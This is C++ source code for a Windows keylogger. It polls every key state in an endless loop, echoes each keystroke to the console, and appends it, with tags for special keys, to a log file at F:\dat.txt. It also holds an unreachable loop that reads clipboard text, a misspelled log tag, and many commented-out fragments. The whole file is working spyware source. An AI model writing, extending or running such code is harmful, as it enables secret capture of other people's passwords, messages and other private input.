#include <iostream>
#include <fstream>
#include <algorithm>
#include <Windows.h>

void LOG(std::string input) {
	std::fstream LogFile;
	LogFile.open("F:\\dat.txt", std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		std::cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		std::cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		std::cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		std::cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		std::cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		std::cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		std::cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		std::cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		std::cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		std::cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		std::cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		std::cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		std::cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		std::cout << "#ALT";
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}

int main() {
	//std::string data;
	const char* m_psz;
	char last[2] = {0, 0};

	while (1) {
		//ActivateKeyboardLayout();
		Sleep(15);
		/*std::cout << GetAsyncKeyState(16);
		continue;*/

		for (unsigned char i = 0; i < 256; i++) {
			//std::cout << i << std::endl;
			if (GetAsyncKeyState(i) == -32767) {
				if (SpecialKeys(i) == false) {
					/*if (GetAsyncKeyState(16) == -32767) {
						std::cout << char(i);

						std::fstream LogFile;
						LogFile.open("F:\\dat.txt", std::ifstream::app);
						if (LogFile.is_open()) {
							LogFile << char(i);
							LogFile.close();
						}
					}*/

					std::string Name(1, i);
					std::transform(Name.begin(), Name.end(), Name.begin(), ::tolower);
					std::cout << Name;

					std::fstream LogFile;
					LogFile.open("F:\\dat.txt", std::ifstream::app);
					if (LogFile.is_open()) {
						LogFile << Name;
						LogFile.close();
					}
				}
				/*if (i == 16) {
					last[0] = 1;
				}

				if ((last[0] == 1) && (i != 16)) {
					std::cout << i;
					last[0] = 0;
					break;
				}
				std::string Name(1, i);
				std::transform(Name.begin(), Name.end(), Name.begin(), ::tolower);
				std::cout << Name;
				break;*/
				/*if (SpecialKeys(i) == false) {

					std::ifstream LogFile;
					LogFile.open("dat.txt", std::ifstream::app);
					if (LogFile.is_open()) {
						LogFile << char(i);
						LogFile.close();
					}

				}*/
			}
		}
		//return 0;
	}

	for (;;) {
		if (1 == 1) {
			OpenClipboard(0);
			HANDLE hData = GetClipboardData(CF_TEXT);
			m_psz = static_cast<const char*>(GlobalLock(hData));
			//GlobalUnlock(hData);
			CloseClipboard();

			std::cout << m_psz << std::endl;
		}
	}
	return 0;
}
